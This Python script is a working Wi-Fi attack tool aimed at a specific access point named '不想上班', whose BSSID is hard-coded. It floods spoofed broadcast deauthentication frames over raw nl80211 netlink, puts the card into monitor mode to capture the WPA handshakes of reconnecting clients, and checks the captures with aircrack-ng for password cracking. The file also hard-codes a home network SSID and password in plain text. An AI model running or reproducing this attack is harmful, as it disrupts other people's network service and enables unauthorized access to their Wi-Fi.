#!/usr/bin/env python3
"""
Deauth attack + handshake capture for "不想上班" AP.
Strategy:
  Phase 1: Connect to target AP (auth+assoc, WPA will fail)
           While connected, flood deauth broadcast frames via nl80211
           PE has valid session → frames actually TX over the air
  Phase 2: After deauth flood, switch to monitor mode to capture
           the handshake from reconnecting clients
  Phase 3: Switch back to STA and reconnect to home AP

Usage: sudo python3 deauth_attack.py
"""
import socket, struct, fcntl, time, subprocess, sys, os, signal

# Configuration
TARGET_BSSID = "04:67:61:d6:dc:92"
TARGET_SSID = "不想上班"
TARGET_FREQ = 2412
TARGET_CHANNEL = 1
IFACE = "wlan0"

HOME_SSID = "9899a5b77"
HOME_PSK = "9006609b29404a"

OWN_MAC = bytes.fromhex("5c17cfbca4e3")
TARGET_BSSID_B = bytes.fromhex(TARGET_BSSID.replace(":", ""))

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

DEAUTH_COUNT = 100       # number of deauth frames per cycle
DEAUTH_INTERVAL = 0.01   # seconds between deauth frames
CAPTURE_TIME = 30        # seconds to capture after deauth
NUM_CYCLES = 3           # number of deauth+capture cycles

def run(cmd, timeout=10):
    """Run shell command and return output"""
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip(), r.stderr.strip(), r.returncode

def wpa_cli(cmd):
    """Run wpa_cli command"""
    out, err, rc = run(f"wpa_cli -i {IFACE} {cmd}")
    return out

def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(s, 0x8933, struct.pack('256s', IFACE.encode()))
    s.close()
    return struct.unpack('I', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def send_deauth(sock, fam, ifidx, freq, sa, bssid, da, reason, seq):
    """Send a deauth frame via nl80211 CMD_FRAME"""
    # Build deauth
    frame = struct.pack("<HH", 0x00c0, 0)   # FC + duration
    frame += da                               # DA
    frame += sa                               # SA (spoofed as AP)
    frame += bssid                            # BSSID
    frame += struct.pack("<H", (seq & 0xfff) << 4)  # seq
    frame += struct.pack("<H", reason)        # reason code

    attrs = nla(3, struct.pack('I', ifidx))   # IFINDEX
    attrs += nla(38, struct.pack('I', freq))  # WIPHY_FREQ
    attrs += nla(51, frame)                    # FRAME
    attrs += struct.pack('HH', 4, 118)        # DONT_WAIT_FOR_ACK

    genlhdr = struct.pack('BBH', 59, 1, 0)   # CMD=59 (CMD_FRAME)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fam, NLM_F_REQUEST|NLM_F_ACK, seq, 0)

    sock.send(nlhdr + payload)
    try:
        resp = sock.recv(4096)
        nltype = struct.unpack_from('H', resp, 4)[0]
        if nltype == 2:
            return struct.unpack_from('i', resp, 16)[0]
        return 0
    except socket.timeout:
        return -1

def phase1_deauth():
    """Connect to target AP and flood deauth frames"""
    print(f"\n[Phase 1] Connecting to {TARGET_SSID} ({TARGET_BSSID})...", flush=True)

    # Add target network
    wpa_cli("remove_network all")
    wpa_cli("add_network")
    wpa_cli(f'set_network 0 ssid \'"{TARGET_SSID}"\'')
    wpa_cli("set_network 0 key_mgmt WPA-PSK")
    wpa_cli('set_network 0 psk \'"12345678"\'')  # dummy PSK
    wpa_cli(f"set_network 0 bssid {TARGET_BSSID}")
    wpa_cli("enable_network 0")
    wpa_cli("select_network 0")

    # Wait for auth+assoc (before WPA4way fails)
    print("  Waiting for auth+assoc...", flush=True)
    for i in range(20):
        time.sleep(0.5)
        status = wpa_cli("status")
        if "wpa_state=COMPLETED" in status or "wpa_state=4WAY_HANDSHAKE" in status:
            print(f"  Connected! State: {'4WAY_HANDSHAKE' if '4WAY' in status else 'COMPLETED'}", flush=True)
            break
        if "wpa_state=ASSOCIATED" in status:
            print(f"  Associated!", flush=True)
            break
    else:
        print("  WARNING: Could not connect to target AP", flush=True)
        return False

    # NOW FLOOD DEAUTH
    print(f"  Sending {DEAUTH_COUNT} deauth frames...", flush=True)

    fam = get_nl80211_family()
    ifidx = get_ifindex()

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(1)

    ok = fail = 0
    seq = 100

    for i in range(DEAUTH_COUNT):
        # Broadcast deauth from AP (spoofed)
        rc = send_deauth(s, fam, ifidx, TARGET_FREQ,
                        TARGET_BSSID_B, TARGET_BSSID_B,
                        b'\xff\xff\xff\xff\xff\xff', 7, seq)
        seq += 1
        if rc == 0:
            ok += 1
        else:
            fail += 1

        if (i+1) % 25 == 0:
            print(f"    [{i+1}/{DEAUTH_COUNT}] ok={ok} fail={fail}", flush=True)

        time.sleep(DEAUTH_INTERVAL)

    s.close()
    print(f"  Deauth complete: {ok} ok, {fail} fail", flush=True)
    return True

def phase2_capture(cycle):
    """Switch to monitor mode and capture handshake"""
    print(f"\n[Phase 2] Switching to monitor mode for capture...", flush=True)

    # Stop wpa_supplicant from interfering
    wpa_cli("disconnect")
    time.sleep(0.5)

    # Switch to monitor mode via con_mode
    run("echo 4 | tee /sys/module/wlan/parameters/con_mode")
    time.sleep(1)

    # Bring interface up
    run(f"ip link set {IFACE} up")
    time.sleep(0.5)

    # Set channel
    run(f"iw dev {IFACE} set freq {TARGET_FREQ}")

    # Start capture
    capfile = f"/tmp/handshake_{cycle}.pcap"
    print(f"  Capturing for {CAPTURE_TIME}s → {capfile}", flush=True)

    cap_proc = subprocess.Popen(
        ["tcpdump", "-i", IFACE, "-w", capfile, "-c", "1000"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    time.sleep(CAPTURE_TIME)

    cap_proc.send_signal(signal.SIGTERM)
    cap_proc.wait(timeout=5)
    stderr = cap_proc.stderr.read().decode()
    print(f"  Capture done: {stderr.strip()}", flush=True)

    return capfile

def phase3_reconnect():
    """Switch back to STA mode and reconnect to home AP"""
    print(f"\n[Phase 3] Reconnecting to {HOME_SSID}...", flush=True)

    # Switch back to STA mode
    run("echo 0 | tee /sys/module/wlan/parameters/con_mode")
    time.sleep(2)

    # Re-add home network
    wpa_cli("remove_network all")
    wpa_cli("add_network")
    wpa_cli(f'set_network 0 ssid \'"{HOME_SSID}"\'')
    wpa_cli(f'set_network 0 psk \'"{HOME_PSK}"\'')
    wpa_cli("enable_network 0")
    wpa_cli("select_network 0")

    # Wait for connection
    for i in range(20):
        time.sleep(1)
        status = wpa_cli("status")
        if "wpa_state=COMPLETED" in status:
            print(f"  Reconnected to {HOME_SSID}!", flush=True)
            return True

    print("  WARNING: Failed to reconnect", flush=True)
    return False

def check_handshake(capfiles):
    """Check captured files for WPA handshake"""
    print("\n[Check] Analyzing captures for WPA handshake...", flush=True)
    for f in capfiles:
        if os.path.exists(f):
            out, _, _ = run(f"aircrack-ng {f} 2>&1 | head -20", timeout=10)
            print(f"  {f}: {out}", flush=True)

def main():
    print("=" * 60)
    print(f"Target: {TARGET_SSID} ({TARGET_BSSID}) ch{TARGET_CHANNEL}")
    print(f"Home:   {HOME_SSID}")
    print(f"Cycles: {NUM_CYCLES}")
    print("=" * 60)

    capfiles = []

    for cycle in range(1, NUM_CYCLES + 1):
        print(f"\n{'='*20} CYCLE {cycle}/{NUM_CYCLES} {'='*20}", flush=True)

        # Phase 1: Connect + deauth
        if not phase1_deauth():
            print("Deauth phase failed, skipping...", flush=True)
            phase3_reconnect()
            continue

        # Phase 2: Capture
        capfile = phase2_capture(cycle)
        capfiles.append(capfile)

        # Phase 3: Reconnect to home
        phase3_reconnect()

        # Brief pause between cycles
        if cycle < NUM_CYCLES:
            print(f"\nWaiting 5s before next cycle...", flush=True)
            time.sleep(5)

    # Check results
    check_handshake(capfiles)

    print("\n" + "=" * 60)
    print("Attack complete!")
    print("Capture files:", capfiles)

if __name__ == "__main__":
    main()
